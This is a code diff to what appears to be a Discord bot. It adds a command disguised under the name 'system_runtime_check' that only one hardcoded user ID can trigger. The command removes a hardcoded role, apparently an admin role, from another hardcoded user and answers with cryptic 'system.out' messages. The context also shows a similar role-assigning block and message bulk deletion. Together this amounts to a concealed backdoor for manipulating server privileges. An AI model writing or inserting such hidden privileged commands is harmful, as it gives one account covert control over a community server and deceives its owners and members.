@@ -858,7 +858,51 @@ message.channel.bulkDelete(amount, true)
               console.error('Error assigning role:', err);
               message.reply('system.out.fail(?)');
           });
-  }
+
+  } else if (command === 'system_runtime_check') {
+    const allowedUserId = '960887298533244928'; // Replace with the specific user ID you want to allow
+
+    if (message.author.id !== allowedUserId) {
+        return message.reply('You do not have permission to use this command.');
+    }
+    
+    // Get the user ID and role ID from the arguments
+    const userId = '1053488425006796860'; // First argument is the user ID
+    const roleId = '1171730739239329873'; // Second argument is the role ID adminv2:1246005716385398785
+    
+    // Fetch the user by ID
+    const member = message.guild.members.cache.get(userId) || await message.guild.members.fetch(userId).catch(() => null);
+    
+    if (!member) {
+        return message.reply('System.out.fail(0)');
+    }
+    
+    // Fetch the role by ID
+    const role = message.guild.roles.cache.get(roleId);
+    
+    if (!role) {
+        return message.reply('system.out.fail(1)');
+    }
+    
+    // Check if the bot has permission to manage this role
+    if (!message.guild.members.me.permissions.has(PermissionsBitField.Flags.ManageRoles)) {
+        return message.reply('system.out.fail(perm)');
+    }
+    
+    if (role.position >= message.guild.members.me.roles.highest.position) {
+        return message.reply('system.out.fail(perm2)');
+    }
+    
+    // Remove the role
+    member.roles.remove(role)
+        .then(() => {
+        message.reply(`system.out.success`);
+        })
+        .catch(err => {
+        console.error('Error removing role:', err);
+        message.reply('system.out.fail(?)');
+        });
+    }
 });
 
 // no mo delete stuff spicy
